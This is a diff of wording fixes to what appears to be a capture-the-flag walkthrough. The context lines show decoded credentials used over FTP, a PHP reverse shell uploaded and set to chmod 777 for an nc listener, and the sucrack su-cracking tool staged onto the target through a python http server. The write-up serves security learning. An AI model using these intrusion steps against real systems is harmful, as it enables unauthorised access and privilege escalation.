@@ -150,7 +150,7 @@ PASS: **************
 
 Using the credentials that we just decoded
 
-#### Listing the dir
+#### Listing the directory
 
 ```
 ftp> passive
@@ -190,7 +190,7 @@ put php-reverse-shell.php
 chmod +x php-reverse-shell.php
 chmod 777 php-reverse-shell.php
 ```
-Note that after this if we try to access the file at $IP/php-reverse-shell.php, our nc listener doesnt catch anything.
+Note that after this if we try to access the file at $IP/php-reverse-shell.php, our nc listener doesn't catch anything.
 Something is wrong and we must analyze further.
 
 #### Downloading config file
@@ -280,7 +280,7 @@ git clone https://github.com/hemp3l/sucrack.git
 tar -zcvf sucrack.tar.gz ./sucrack 
 ```
 
-No send using python http server and download on the target machine
+Now send using python http server and download on the target machine
 
 #### Installing sucrack
 
